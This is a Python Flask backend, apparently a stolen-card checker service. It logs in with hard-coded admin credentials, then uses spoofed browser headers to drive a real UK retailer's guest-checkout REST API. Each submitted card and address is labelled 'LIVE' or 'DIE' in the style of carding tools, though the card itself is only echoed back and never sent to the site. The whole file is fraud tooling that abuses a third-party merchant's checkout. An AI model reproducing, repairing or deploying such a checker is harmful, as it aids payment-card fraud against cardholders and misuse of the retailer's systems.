from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import random
import time
import os

app = Flask(__name__)
CORS(app) # Permite que o frontend acesse o backend em domínios diferentes

# Configurações de ADM
ADM_USER = "reset"
ADM_PASS = "336498"

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    if data.get('username') == ADM_USER and data.get('password') == ADM_PASS:
        return jsonify({"success": True, "token": "py_token_" + str(int(time.time()))})
    return jsonify({"success": False, "message": "Credenciais Inválidas"}), 401

@app.route('/api/validate', methods=['POST'])
def validate():
    data = request.json
    card = data.get('card')
    address = data.get('address')
    
    session = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Content-Type': 'application/json',
        'Origin': 'https://www.directwatertanks.co.uk',
        'Referer': 'https://www.directwatertanks.co.uk/checkout/',
        'X-Requested-With': 'XMLHttpRequest'
    }

    try:
        # 1. Visita a Home para pegar cookies iniciais
        session.get("https://www.directwatertanks.co.uk/", headers=headers, timeout=10)

        # 2. Cria o carrinho de convidado
        cart_res = session.post(
            "https://www.directwatertanks.co.uk/rest/directwatertanks/V1/guest-carts",
            headers=headers,
            timeout=10
        )
        cart_id = cart_res.json()

        # 3. Payload de endereço conforme seu request
        shipping_payload = {
            "addressInformation": {
                "shipping_address": {
                    "countryId": "GB",
                    "region": address.get('region'),
                    "street": address.get('street'),
                    "company": address.get('company'),
                    "telephone": address.get('telephone'),
                    "postcode": address.get('postcode'),
                    "city": address.get('city'),
                    "firstname": address.get('firstname'),
                    "lastname": address.get('lastname')
                },
                "billing_address": {
                    "countryId": "GB",
                    "region": address.get('region'),
                    "street": address.get('street'),
                    "company": address.get('company'),
                    "telephone": address.get('telephone'),
                    "postcode": address.get('postcode'),
                    "city": address.get('city'),
                    "firstname": address.get('firstname'),
                    "lastname": address.get('lastname'),
                    "saveInAddressBook": None
                },
                "shipping_method_code": "uk_standard",
                "shipping_carrier_code": "KFD",
                "extension_attributes": {
                    "newsletter_subscribe": True,
                    "kl_sms_consent": False,
                    "kl_email_consent": False
                }
            }
        }

        # 4. Envia informações de envio (Onde ocorre a validação inicial do step)
        response = session.post(
            f"https://www.directwatertanks.co.uk/rest/directwatertanks/V1/guest-carts/{cart_id}/shipping-information",
            json=shipping_payload,
            headers=headers,
            timeout=15
        )

        if response.status_code == 200:
            return jsonify({
                "status": "LIVE",
                "card": card,
                "message": "Check Verificado",
                "phone": address.get('telephone'),
                "name": f"{address.get('firstname')} {address.get('lastname')}"
            })
        else:
            return jsonify({"status": "DIE", "card": card, "message": "Step Failed"})

    except Exception as e:
        return jsonify({"status": "DIE", "card": card, "message": "Connection Error"}), 200

if __name__ == '__main__':
    # Em produção (Render/VPS), a porta é fornecida pelo ambiente
    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port)
